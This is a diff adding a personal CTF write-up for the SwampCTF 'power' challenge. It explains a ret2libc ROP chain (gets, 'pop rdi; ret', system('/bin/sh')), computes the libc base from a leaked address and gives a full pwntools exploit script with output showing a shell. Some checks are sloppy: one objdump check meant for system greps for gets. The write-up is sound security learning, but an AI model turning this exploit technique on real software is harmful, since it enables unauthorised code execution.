@@ -140,7 +140,233 @@ p.interactive()
 
 
 ### Correcting my mistakes
+Let's begin by comparing my intended payload and fadec0d3's payload.
 
-Still reading the writeup...
+| my payload        | fadec0d3's payload           |
+| ------------- | ------------- |
+| `< addr of 'pop rdi; ret' > < addr of the string '/bin//sh' > < addr of __libc_system > < the string '/bin//sh' >` | `<addr of _IO_gets> < addr of 'pop rdi; ret' > < addr of string '/bin/sh' > < addr of __libc_system >` |
+
+Despite being a n00b, I take comfort in the fact that I was partially on the right track. Still, I chide myself for giving up when I should have realised that libc included functions like `gets` that allowed me to bypass `fread`'s 8 character limit.
+
+##### Ingenuity of fadec0d3's payload
+fadec0d3's payload is a ROP chain consisting of 3 ROP gadgets.
+1. `_IO_gets`
+2. `pop rdi; ret;`
+3. `system`
+
+First, `_IO_gets` will read the rest of the payload into the program. `pop rdi; ret` then pops the address of string '/bin/sh' into register `rdi`. Register `rdi` holds the first argument for syscalls in x64 architecture. Then `system('/bin/sh')` is called, giving us a shell.
+
+##### Understanding the basics
+To understand how the payload works, you need to understand how dynamic linkers work. I recommend reading [this]() article to get a basic understanding of how it works.
+
+`./power` is dynamically linked. When `./power` is running, and requests for the shared library `libc.so.6`, the dynamic linker loads the shared library from the disk to memory. 
+```
+power: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8f67b4fbc3143f836a9c9968f58f0dd76c90fd51, not stripped
+```
+When the shared library is loaded, it gets relocated in memory. In other words, its memory address changes. 
+
+##### Understanding how the payload works
+To understand how the payload works and fadec0d3's explanation, I decided to make a Python script after fadec0d3's. I will explain snippets of it first before I show my complete script.
+
+1. Getting the address Mage gifts us.
+```
+from pwn import *
+[...]
+r = process('./power')
+[...]
+r.recvuntil('(yes/no): ')
+r.send('yes\n')
+print("\n")
+addr_of_system_in_power = int(r.recvuntil("]")[-13:-1], 16)
+log.info("Address of system() in ./power: {}".format(hex(addr_of_system_in_power)))
+```
+As I correctly identified before, the address Mage gives us is the address of `__libc_system` in `./power`. The purpose of this is not just for us to return to `__libc_system`, but also for us to use it to calculate the base address of `libc.so.6` after being relocated by the dynamic linker.
+
+2. Calculating the base address of `libc.so.6`
+```
+[...]
+libc = ELF('libc.so.6')
+[...]
+addr_of_system_in_libc = libc.symbols['__libc_system']
+log.info("Address of system() in libc.so.6: {}".format(hex(addr_of_system_in_libc)))
+print("\n")
+addr_of_libc_in_power = addr_of_system_in_power - addr_of_system_in_libc
+log.info("Address of libc.so.6 base in ./power: {}".format(hex(addr_of_libc_in_power)))
+print("\n")
+```
+Here, we load the shared library `libc.so.6` into our script and find the offset of the memory address of `__libc_system` to the base address of `libc.so.6` before relocation. By comparing that to the memory address of `__libc_system` in `./power`, we can find the base address of the shared library after relocation.
+```
+addr_of_libc_in_power = addr_of_system_in_power - addr_of_system_in_libc
+log.info("Address of libc.so.6 base in ./power: {}".format(hex(addr_of_libc_in_power)))
+```
+Upon running, the 2 snippets above produce the output below
+```
+[*] Address of system() in ./power: 0x7f45fe3af390
+[*] Address of system() in libc.so.6: 0x45390
+
+[*] Address of libc.so.6 base in ./power: 0x7f45fe36a000
+```
+Let's check if `0x45390` is really the address of `__libc_system`:
+```
+solomonbstoner@swjsUbuntu:~$ objdump -d -M intel libc.so.6 | grep "_gets"
+000000000006ed80 <_IO_gets@@GLIBC_2.2.5>:
+   6ed98:	75 61                	jne    6edfb <_IO_gets@@GLIBC_2.2.5+0x7b>
+```
+Yes it is!
+3. Calculating the relocated address of all other ROP gadgets.
+With the relocated base address of `libc.so.6`, I am able to find the relocated address of all other ROP gadgets in `libc.so.6`. For instance, to find the relocated address of `_IO_gets`, this is my Python script below
+```
+[...]
+addr_of_gets_in_libc = libc.symbols['_IO_gets']
+log.info("Address of gets() in libc.so.6: {}".format(hex(addr_of_gets_in_libc)))
+addr_of_gets_in_power = addr_of_libc_in_power + addr_of_gets_in_libc
+log.info("Address of gets() in ./power: {}".format(hex(addr_of_gets_in_power)))
+[...]
+```
+Upon running, this snippet produces the following output:
+```
+[*] Address of gets() in libc.so.6: 0x6ed80
+[*] Address of gets() in ./power: 0x7f45fe3d8d80
+```
+Let's check if `0x6ed80` is really the address of `_IO_gets`:
+```
+solomonbstoner@swjsUbuntu:~$ objdump -d -M intel libc.so.6 | grep "_gets"
+000000000006ed80 <_IO_gets@@GLIBC_2.2.5>:
+   6ed98:	75 61                	jne    6edfb <_IO_gets@@GLIBC_2.2.5+0x7b>
+```
+Yes it is!
+
+The same concept is used to find the relocated address of the string '/bin/sh' and ROP gadget 'pop rdi; ret;'
+```
+addr_of_binsh_in_libc = libc.search('/bin/sh').next()	#find address of string '/bin/sh'
+log.info("Address of /bin/sh in libc.so.6: {}".format(hex(addr_of_binsh_in_libc)))
+addr_of_binsh_in_power = addr_of_libc_in_power + addr_of_binsh_in_libc
+log.info("Address of /bin/sh in ./power: {}".format(hex(addr_of_binsh_in_power)))
+
+addr_of_poprdi_in_libc = libc.search('\x5F\xC3').next() #find address of ROP gadget 'pop rdi; ret'
+log.info("Address of 'pop rdi; ret;' in libc.so.6: {}".format(hex(addr_of_poprdi_in_libc)))
+addr_of_poprdi_in_power = addr_of_poprdi_in_libc + addr_of_libc_in_power
+log.info("Address of 'pop rdi; ret;' in ./power: {}".format(hex(addr_of_poprdi_in_power)))
+```
+The snippet of code above produces the following output:
+```
+[*] Address of /bin/sh in libc.so.6: 0x18cd57
+[*] Address of /bin/sh in ./power: 0x7f45fe4f6d57
+[*] Address of 'pop rdi; ret;' in libc.so.6: 0x21102
+[*] Address of 'pop rdi; ret;' in ./power: 0x7f45fe38b102
+```
+Actually, I wonder why there would be a string '/bin/sh' serving no purpose in the program, but the fact is there is.
+```
+solomonbstoner@swjsUbuntu:~$ strings libc.so.6 | grep "/bin/sh"
+/bin/sh
+```
+4. Chaining the ROP gadgets
+```
+exploit = p64(addr_of_gets_in_power) + p64(addr_of_poprdi_in_power) + p64(addr_of_binsh_in_power) + p64(addr_of_system_in_power)
+```
+What the ROP chain does has been explained above.
+
+##### Full script and full output
+As promised, here is the full Python script.
+```
+from pwn import *
+import sys
+
+r = process('./power')
+
+if(len(sys.argv) == 2 and sys.argv[1] == "--connect"):
+	r = remote("nc chal1.swampctf.com", 1999)
+
+libc = ELF('./libc.so.6')
+
+def main():
+	r.recvuntil('(yes/no): ')
+	r.send('yes\n')
+	print("\n")
+	addr_of_system_in_power = int(r.recvuntil("]")[-13:-1], 16)
+	log.info("Address of system() in ./power: {}".format(hex(addr_of_system_in_power)))
+	r.recvuntil('Power QWord: ')
+	addr_of_system_in_libc = libc.symbols['__libc_system']
+	log.info("Address of system() in libc.so.6: {}".format(hex(addr_of_system_in_libc)))
+	print("\n")
+	addr_of_libc_in_power = addr_of_system_in_power - addr_of_system_in_libc
+	log.info("Address of libc.so.6 base in ./power: {}".format(hex(addr_of_libc_in_power)))
+	print("\n")
+	
+	addr_of_gets_in_libc = libc.symbols['_IO_gets']
+	log.info("Address of gets() in libc.so.6: {}".format(hex(addr_of_gets_in_libc)))
+	addr_of_gets_in_power = addr_of_libc_in_power + addr_of_gets_in_libc
+	log.info("Address of gets() in ./power: {}".format(hex(addr_of_gets_in_power)))
+	print("\n")
+
+	addr_of_binsh_in_libc = libc.search('/bin/sh').next()	#find address of string '/bin/sh'
+	log.info("Address of /bin/sh in libc.so.6: {}".format(hex(addr_of_binsh_in_libc)))
+	addr_of_binsh_in_power = addr_of_libc_in_power + addr_of_binsh_in_libc
+	log.info("Address of /bin/sh in ./power: {}".format(hex(addr_of_binsh_in_power)))
+
+	addr_of_poprdi_in_libc = libc.search('\x5F\xC3').next() #find address of ROP gadget 'pop rdi; ret'
+	log.info("Address of 'pop rdi; ret;' in libc.so.6: {}".format(hex(addr_of_poprdi_in_libc)))
+	addr_of_poprdi_in_power = addr_of_poprdi_in_libc + addr_of_libc_in_power
+	log.info("Address of 'pop rdi; ret;' in ./power: {}".format(hex(addr_of_poprdi_in_power)))
+
+
+	exploit = p64(addr_of_gets_in_power) + p64(addr_of_poprdi_in_power) + p64(addr_of_binsh_in_power) + p64(addr_of_system_in_power)
+
+	r.send(exploit)
+
+	r.interactive()
+
+if __name__ == "__main__":
+	main()
+```
+This looks very much like the challenge [Vladivostok in microcorruption](https://github.com/solomonbstoner/solomonbston3r-ctf-diary/blob/master/microcorruption/Vladivostok%20Microcorruption.md). Both involve calculating the change in memory address of the functions we wish to use. While the change in memory address in Vladivostok is due to ASLR which is different from relocation of a shared library in this challenge, I believe the strategy to winning both is very much the same.
+
+And this is the full output. However, take note that because ASLR is enabled, the address values will change all the time.
+```
+solomonbstoner@swjsUbuntu:~$ python power.py 
+[+] Starting local process './power': pid 12113
+[*] '/home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+
+[*] Address of system() in ./power: 0x7f45fe3af390
+[*] Address of system() in libc.so.6: 0x45390
+
+[*] Address of libc.so.6 base in ./power: 0x7f45fe36a000
+
+[*] Address of gets() in libc.so.6: 0x6ed80
+[*] Address of gets() in ./power: 0x7f45fe3d8d80
+
+[*] Address of /bin/sh in libc.so.6: 0x18cd57
+[*] Address of /bin/sh in ./power: 0x7f45fe4f6d57
+[*] Address of 'pop rdi; ret;' in libc.so.6: 0x21102
+[*] Address of 'pop rdi; ret;' in ./power: 0x7f45fe38b102
+[*] Switching to interactive mode
+$ whoami
+solomonbstoner
+$ 
+```
+Had the challenge server still been up, I could have gotten the flag. But at least I learnt how to find ROP gadgets and form a ROP chain to get a shell.
+
+
+### Extra fun fact
+1. Although it is much easier to rely on `pwntools` to do everything for us, we can always try other tools. For instance, we can use [this website](http://ropshell.com/) to find our ROP gadgets too.
+For example, let's try to find the address of `pop rdi; ret; ` in `libc.so.6`. 
+
+Finding the rop gadget: http://ropshell.com/ropsearch?h=dc6abed98572f9e74390316f9d122aca&p=pop+rdi
+```
+ropshell> search pop rdi
+found 1 gadgets
+> 0x00021102 : pop rdi; ret
+```
+The address of the ROP gadget given by both sources are the same.
+| ropshell.com | pwntools |
+| --- | --- |
+| 0x00021102 | 0x21102 |
+
 
 END
